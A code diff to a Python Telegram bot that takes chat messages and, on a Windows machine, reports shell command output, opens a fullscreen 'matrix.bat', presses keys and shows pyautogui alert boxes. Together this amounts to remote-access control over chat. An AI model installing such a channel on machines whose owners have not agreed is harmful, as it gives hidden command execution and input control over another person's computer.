@@ -7,6 +7,7 @@ import time
 
 import keyboard
 import mouse
+import pyautogui
 
 from telegram import Update, ForceReply
 from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
@@ -74,8 +75,40 @@ def handle_command(messageText, user):
             if line:
                 output += line.decode('cp866')
 
-        print(output)
-        result = f'Output for command :"{str(command)}" is: "{output}"'
+        command = messageText.split('cmd ')[1]
+        result = f'Output for command:\n{command} \nIs:\n {output}'
+    elif messageText == 'matrix':
+        os.startfile("matrix.bat")
+        time.sleep(0.1)
+        keyboard.press("alt")
+        keyboard.press("enter")
+        keyboard.release("alt")
+        keyboard.release("enter")
+        result = 'Matrix shown'
+    elif messageText.startswith('press ') or messageText.startswith('type '):
+        key = messageText.split('press ')
+        if key[0] == messageText:
+            key = messageText.split('type ')
+            if key[0] == messageText:
+                return 'Invalid key'
+        try:
+            keyboard.press(key[1])
+            keyboard.release(key[1])
+            result = f'Key {key} typed'
+        except ValueError as error:
+            result = f'Failed to press{key[1]}: error was: \n{error}'
+    elif messageText.startswith('alert '):
+        command_text = messageText.split('alert ')[1]
+        print(command_text.split())
+        print(command_text.split().__len__())
+        if command_text.split().__len__() != 3:
+            return 'Wrong format: should be:\nalert title, text, button_text'
+        title = command_text.split()[0]
+        text = command_text.split()[1]
+        button_text = command_text.split()[2]
+        pyautogui.alert(text=text, title=title, button=button_text)
+        result = f'Alert window with title: {title}, text: {text} and button text: {button_text} was shown'
+
     return result
 
 
